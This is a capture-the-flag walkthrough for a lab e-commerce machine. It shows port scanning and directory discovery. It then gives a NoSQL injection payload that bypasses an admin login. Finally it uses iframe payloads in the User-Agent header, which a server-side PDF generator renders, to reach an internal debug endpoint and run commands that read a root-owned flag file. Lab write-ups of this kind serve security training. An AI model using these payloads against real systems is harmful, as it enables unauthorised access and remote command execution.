There are total of 2 flags here.

1. `FLAG{NOSQL_INJECTION_IS_AWESOME_IKODSD}` - _This requires an exploitation of NoSQL Injection_
2. `FLAG{SSRF_IS_AWESOME_UDKSO}` - _This requires an exploitation of SSRF -> RCE_

### Steps to reproduce.

1. First of all, let's port scan the server.
2. Let's run `nmap -sV -sC <ip>`
3. You will receive the following output.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-05 13:39 UTC
Nmap scan report for 192.168.8.100
Host is up (0.00059s latency).
Not shown: 994 closed ports
PORT    STATE    SERVICE    VERSION
22/tcp  open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
25/tcp  filtered smtp
80/tcp  open     http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://1337shop.com/
443/tcp open     ssl/https  Apache/2.4.41 (Ubuntu)
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
465/tcp filtered smtps
587/tcp filtered submission
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.05 seconds
```

4. As you can see, there is a HTTP server running at port 80.
5. Let's visit that port and You will notice the that it is redirecting us to `http://1337shop.com/`
6. ![](./assets/1.png)
7. But, that domain is not registered and there is nothing.
8. So, let's try pointing `1337shop.com` to `<machine-ip>`
9. Use the `/etc/hosts` file _(Linux)_ or `C:\Windows\system32\drivers\etc\hosts` file to do this.
10. Add the following line to `/etc/hosts`

```
192.168.8.100   1337shop.com
```

11. Now, visit `http://1337shop.com`.
12. Now you will see a e-commerce website.
13. Let's run `dirsearch` to discover more hidden directories.
14. You will receive following results.
15. ![](./assets/2.png)
16. As you can see there are some interesting directories like `/debug` and `/admin`
17. When we visit `/debug`, we get the following response.

```json
{
    "success": false,
    "error": "This endpoint only allows traffic from 127.0.0.1:3000"
}
```

18. And, `/admin` redirects us to `/admin/login`, which is a login page.
19. Now, let's try the credentials `admin:admin`
20. Notice that the credentials are being sent using `application/json` content type.
21. And, let's try some NoSQL injections here.
22. We can use this payload to bypass the auth `{"$ne":0}`. _(Payload: Not equals to 0)_
    ![](./assets/4.png)
    ![](./assets/5.png)
    ![](./assets/6.png)
23. Now, we can access the admin panel.
24. In the HTML Source code of `/admin`, first flag can be found. - `FLAG{NOSQL_INJECTION_IS_AWESOME_IKODSD}`
    ![](./assets/7.png)
25. Now, let's explore the admin panel.
26. You will notice that the NoSQL injection breaked the session and most of the features are not working here. _(These features are not implemented in the source code)_
27. There is an interesting feature called `Download Reports -> Previous Login Logs`
    ![](./assets/8.png)
28. When we click it, it downloads a PDF document from `http://1337shop.com/admin/logs/prev-logins?download=1`
    ![](./assets/9.png)
29. As you can see whenever someone logs in, browser's user-agent is logged here.
30. Let's check for any HTML injections there.
31. Send `<h1>Test <u>Underlined</u></h1>` in the User-Agent header in the login request.
    ![](./assets/10.png)
32. Now, request the PDF document again.
33. You will notice the HTML content there.
    ![](./assets/11.png)
34. Now, let's try requesting `http://127.0.0.1:3000/debug` using an `iframe` tag. _(There is a hint for this at http://1337shop.com/debug)_
35. We can use the payload -> `<iframe src="http://127.0.0.1:3000/debug">` in the User-Agent header in the login request.
36. Now, request the PDF document again.
    ![](./assets/12.png)
37. So, the response is

```json
{
    "success": false,
    "error": "Missing 'cmd' parameter"
}
```

38. Now use the `cmd` parameter in the `http://127.0.0.1:3000/debug` to get RCE in the system
39. We can read the final flag by using `<iframe src="http://127.0.0.1:3000/debug?cmd=cat%20/root/flag">`
    ![](./assets/13.png)
    ![](./assets/14.png)
40. That's it.

Thanks!
